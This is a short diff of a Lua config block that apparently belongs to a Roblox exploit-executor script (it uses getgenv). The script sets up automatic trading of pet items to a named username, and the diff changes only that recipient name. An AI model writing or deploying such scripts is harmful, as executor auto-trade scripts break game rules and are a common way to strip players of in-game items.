@@ -1,7 +1,7 @@
 task.spawn(function()
     getgenv().Config = {
         ["inventory"] = "pets", -- Adapt to stickers, gifts, toys, pet_accessories, transport
-        ["username"] = "ldvnsjauevievi2409",
+        ["username"] = "sjuwueemvyvy2506",
         ["pets_to_trade"] = {"winter_2024_bauble_buddies"}
     }
     getgenv().trade_status = true
